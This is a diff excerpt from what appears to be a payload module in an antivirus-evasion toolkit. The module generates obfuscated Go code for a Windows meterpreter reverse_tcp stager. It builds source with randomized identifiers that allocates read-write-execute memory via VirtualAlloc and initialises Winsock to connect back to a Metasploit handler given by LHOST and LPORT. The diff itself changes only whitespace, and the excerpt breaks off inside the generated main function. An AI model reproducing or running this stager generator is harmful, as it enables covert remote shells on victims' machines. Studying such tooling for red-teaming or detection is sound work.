@@ -12,14 +12,14 @@ from modules.common import helpers
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
         self.language = "Go"
         self.extension = "go"
         self.rating = "Normal"
-        
+
         # options we require user ineraction for- format is {Option : [Value, Description]]}
         self.required_options = {   "LHOST" : ["", "IP of the metasploit handler"],
                                     "LPORT" : ["", "Port of the metasploit handler"],
@@ -51,18 +51,21 @@ class Payload:
         handle = helpers.randomString()
         x = helpers.randomString()
         value = helpers.randomString()
-  
+
         payloadCode = "package main\nimport (\n\"encoding/binary\"\n\"syscall\"\n\"unsafe\"\n)\n"
         payloadCode += "const (\n"
         payloadCode += "%s  = 0x1000\n" %(memCommit)
         payloadCode += "%s = 0x2000\n" %(memReserve)
         payloadCode += "%s  = 0x40\n)\n" %(pageExecRW)
+
         payloadCode += "var (\n"
         payloadCode += "%s    = syscall.NewLazyDLL(\"kernel32.dll\")\n" %(kernel32)
         payloadCode += "%s = %s.NewProc(\"VirtualAlloc\")\n)\n" %(procVirtualAlloc, kernel32)
+
         payloadCode += "func %s(%s uintptr) (uintptr, error) {\n" %(virtualAlloc, size)
         payloadCode += "%s, _, %s := %s.Call(0, %s, %s|%s, %s)\n" %(addr, err, procVirtualAlloc, size, memReserve, memCommit, pageExecRW)
         payloadCode += "if %s == 0 {\nreturn 0, %s\n}\nreturn %s, nil\n}\n" %(addr, err, addr)
+
         payloadCode += "func main() {\n"
         payloadCode += "var %s syscall.WSAData\n" %(wsadata)
         payloadCode += "syscall.WSAStartup(uint32(0x202), &%s)\n" %(wsadata)
